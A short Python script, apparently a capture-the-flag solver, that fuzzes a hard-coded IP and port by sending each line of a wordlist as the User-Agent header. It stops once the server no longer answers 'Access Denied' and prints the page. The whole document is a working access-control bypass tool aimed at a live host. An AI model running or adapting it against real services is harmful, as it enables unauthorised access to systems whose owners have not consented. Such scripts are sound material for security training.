import requests

def spoof(payload):
	headers = {
		'User-agent': "%s" %  payload
	}
	r = requests.get("http://199.247.6.180:12003", headers=headers)
	if "Access Denied" in r.text:
		print "[n] Failed, %s" % payload
		return False
	else:
		print "[y] Success, %s " % payload
		print r.text
		return True


lines = [line.rstrip('\n') for line in open('quick_fuzz.txt')]
for line in lines:
	try:
		if spoof(line):
			break
	except:
		pass